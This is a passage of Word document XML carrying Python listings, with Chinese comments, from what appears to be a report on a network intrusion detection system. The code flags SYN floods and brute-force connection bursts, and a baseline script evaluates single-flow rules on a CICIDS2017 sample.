          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A1CD16C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5141E1DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 单流规则同样走去重域：一次洪泛里每条流都命中，不去重会把看板刷满</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63294CB5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for hit in flow_rules(feats):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05798B27">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if self._should_report(self._scope(probe_id, hit.rule, src_key, dst_key), ts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2261491A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                hits.append(hit)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67893F02">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B83C652">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 同一目的端口上的连接激增：用 SYN 是否被应答区分半连接与完整连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE24DBF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dq2 = self._bucket(self._dst, dst_key, cutoff)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17570E45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        syn_only = syn &gt;= 1 and ack == 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7A2475">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dq2.append((ts, syn_only, fwd + bwd &lt;= BRUTE_SHORT_PKTS))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587C7967">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0045A4BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if syn_only:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FDC56E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n = sum(1 for (_t, s, _short) in dq2 if s)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F3810F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if n &gt;= self.syn_flood_conns and self._should_report(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FAB547">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self._scope(probe_id, "syn_flood", src_key, dst_key), ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1617F3AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6F5F19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F551810">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "syn_flood", "DDoS", float(n), float(self.syn_flood_conns),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59295873">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    f"目的 {dst_ip}:{dst_port} 在 {self.window:g} 秒内收到 {n} 条未应答的 SYN 流",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2486C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA4B165">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F9FCFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n = sum(1 for (_t, s, short) in dq2 if not s and short)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0881271E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if n &gt;= self.brute_conns and self._should_report(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3314F2E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self._scope(probe_id, "brute_force", src_key, dst_key), ts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0B5C45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40753F76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468D057C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "brute_force", "Patator", float(n), float(self.brute_conns),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0883A8A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    f"目的 {dst_ip}:{dst_port} 在 {self.window:g} 秒内发生 {n} 次短连接，符合暴力破解",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA3ED9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0B00E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53F65695">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for hit in hits:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7FB716">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.counts[hit.rule] = self.counts.get(hit.rule, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC3ABF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.by_category[hit.category] = self.by_category.get(hit.category, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574E75AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return hits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0930D7D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="135402D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def hits_by_category(self) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FF8212">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return dict(self.by_category)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CCBA18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C732FE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def stats(self) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4097FCE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D105B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "window_s": self.window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7E601B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "tracked_sources": len(self._src),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BEEEE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "tracked_destinations": len(self._dst),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48BC3E2C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "hits": dict(self.counts),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8931CC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "by_category": dict(self.by_category),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04CC00CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34954EB0">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="174F8F9F">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-28　tools/rules_baseline.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（109 行）　M11 规则基线评测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF2742E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M11 离线基线：单流规则在时间留出集上的表现，用来和小模型同口径对照。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279B6683">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50601E17">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    python tools/rules_baseline.py --data data/cicids2017_sample.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A78D81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B680186">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>只有**单流规则**能在这里评。CSV 里没有时间戳、没有源/目的 IP——端口扫描要的"同一源在</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3FCFCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>窗口内探了多少个目的端口"一行都没有，暴力破解同理。所以这份结果测的是规则的弱化形态，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B04105A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>不是线上规则引擎的全部能力。报告里必须这么写，否则会拿一个必然很差的数字去替规则层下结论。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317EE6B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C72FC21">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51F138E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EED966B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E9DDF0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B37584">
